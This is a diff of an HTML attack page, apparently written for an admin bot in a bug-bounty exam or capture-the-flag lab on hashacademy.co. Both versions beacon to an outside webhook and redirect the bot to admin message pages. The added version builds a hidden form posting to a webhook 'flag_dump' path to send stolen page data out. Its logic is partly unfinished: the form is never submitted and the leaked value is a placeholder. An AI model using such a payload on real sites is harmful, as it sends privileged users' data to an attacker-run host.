@@ -2,15 +2,27 @@
 <html>
 <body>
     <script>
-        const webhook = "https://webhooksite.net/af8d2f8d-349b-48e1-8b7a-78b2294cf0d2";
-        const trapId = "69e101b0bee6d6b7c6626aa6"; 
-        const targetUrl = "https://bugbounty-exam.hashacademy.co/admin/messages/" + trapId;
+        // 1. Confirm the bot is here
+        new Image().src = "https://webhooksite.net/af8d2f8d-349b-48e1-8b7a-78b2294cf0d2?step=final_form_loaded";
 
-        const ping = new Image();
-        ping.onload = ping.onerror = function() {
-            window.location.replace(targetUrl);
-        };
-        ping.src = webhook + "?step=exploit_loaded_v3";
+        // 2. Create a form that points to your webhook
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://webhooksite.net/af8d2f8d-349b-48e1-8b7a-78b2294cf0d2/flag_dump';
+
+        // 3. Try to grab the page source from the bot's previous tab
+        // We'll use a hidden input to carry the 'window.name' or 'opener' info
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'content';
+        input.value = 'Attempting_Redirect_Leak'; 
+        
+        form.appendChild(input);
+        document.body.appendChild(form);
+
+        // Redirect the bot back to the admin profile, 
+        // but with a payload that submits the data to us
+        window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e1012bbee6d6b7c6626a7f";
     </script>
 </body>
 </html>
